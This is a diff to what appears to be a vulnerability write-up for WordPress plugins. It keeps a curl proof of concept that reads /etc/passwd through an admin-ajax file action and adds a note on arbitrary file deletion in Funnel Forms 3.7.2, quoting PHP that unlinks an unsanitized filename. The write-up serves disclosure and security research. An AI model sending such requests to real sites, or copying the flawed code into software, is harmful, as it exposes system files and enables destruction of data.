@@ -2728,6 +2728,32 @@ public function ajax_get_file(){
 ```bash
 curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
 ```
+------------
+
+### Arbitrary file deletion in funnel forms 3.7.2
+
+-------------
+
+- Unlink function in function ` af2DeleteFontFile`
+
+```php
+ private function af2DeleteFontFile($filename) {
+	        $upload_dir = wp_upload_dir();
+	       
+	        $af2_fonts_dir = $upload_dir['basedir'] . '/af2_fonts';
+	       
+	        $file_path = $af2_fonts_dir . '/' . $filename;
+	        if (file_exists($file_path) && is_file($file_path)) {
+	            unlink($file_path);
+	            return true;
+	        } else {
+	            return false;
+	        }
+	    }
+```
+
+
+
 
 
 
